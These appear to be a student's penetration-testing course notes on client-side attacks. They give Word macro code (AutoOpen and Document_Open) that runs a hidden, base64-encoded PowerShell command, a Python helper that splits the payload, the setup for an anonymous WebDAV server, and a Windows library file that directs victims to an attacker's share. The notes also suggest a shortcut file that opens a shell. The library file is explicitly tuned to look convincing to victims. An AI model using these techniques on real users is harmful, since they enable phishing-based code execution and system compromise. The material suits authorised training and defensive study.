## Section 2 Exploiting Microsoft Office
### Subsection 11.2.3 Leveraging Microsoft Word Macros
- Steps 
	- Save the document as a .doc file
		- .docx files don't allow for direct macro execution on the host system
	- Write the macro as follows in the example
- Python code to get the base64 into the right size
```
# Use the one-liner and powershell conversion used previously to create the base64 string that will be used as STRING below
str = "powershell.exe -nop -w hidden -e STRING"

n = 50

for i in range(0, len(str),n):
     print("Str = Str + " + '"' + str[i:i+n] + '"')
```
- Example
```
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()

	Dim Str As String
	PASTE FIRST LINE OF OUTPUT FROM THE PYTHON SCRIPT
		PASTE THE REMAINING LINES OF OUTPUT FROM THE PYTHON SCRIPT
	CreateObject("Wscript.Shell").Run Str
```
## Section 3 Abusing Windows Library Files
### Subsection 11.3.1 Obtaining Code Execution via Windows Library Files 
- File extension for a library file is .Library-ms
- These files are virtual containers for user content
	- Can connect users with data stored in remote locations like web services or shares
	- Are executed by double-clicking on them 
- Creating a Windows library file connecting to a WebDAV share 
	- Setting up the WebDAV share 
```
python3 -m pip install wsgidav
```
OR
```
sudo apt install -y python3-wsgidav
```
```
mkdir /home/kali/webdav
```
```
touch /home/kali/webdav/test.txt
```
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
- Creating the config.Library-ms file
	- Consists of 
		- General Library Information
		- Library properties 
		- Library locations
		- XML format
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll, 34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://SERVER_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- Tags 
	- name
		- This is the name of the library and is not something that can be set randomly
		- This must be the name of a library by providing the DLL name and index which van be found on Microsoft's website
		- This example uses @windows.storage.dll,-34582 
		- Can also use @shell32.dll,-34575
	- version
		- set to a numerical value of your choice 
	- isLibraryPinned
		- Specifies if the library is pinned to the navigation pane in windows explorer
			- set to true because it may be another small detail to make the whole process feel more genuine
	- iconReference
		- Determines which icon is used to display the library file
		- Must be specified in the same format as the name element
		- This example uses imagesres.dll to choose between all windows icon -1002 for the Documents folder icon and -1003 for the Pictures folder icon
	- templateInfo
		- Contains the folderType tags
			- Determine the columns and details that appear in windows explorer by default after opening the library
			- You have to specify a GUID you can lookup on the microsoft documentation webpage
			- This example uses the Documents  GUID to appear as convincing as possible
	- searchConnectorDescriptionList
		- Contains the searchConnectorDescription tag
			- Search connectors are used by library files to specify the connection settings to a remote location
			- You can specify one or more searchConnectorDescription elements inside the searchConnectorDescriptionList tags
			- This example provides information to our WebDAV share
			- isDefaultSaveLocation
				- determines the behavior of windows explorer when a user chooses to save an item
				- to use the default behavior and location we set it to true
			- isSupported
				- not documented in the microsoft documentation webpage and is used for compatibility so we set it to false 
			- simpleLocation
				- Used to specify the remote location in a more user-friendly way as the normal locationProvider element
				- url
					- Server IP or where the file(s) are located
					- This example points to our WebDav share
- Every time that a library file is executed it is modified and includes serialized base64 code and may not run correctly the next time so it is important to use a new file each time of execution.
- You can also create a shortcut file on the victim computer for them to click that looks benign but in the location box when you set it up you enter the powershell one-liner from previous exercises and when it's double-clicked you'll get a shell. 
## Exercises To-Do

- [ ] 2.1.1 (page 20)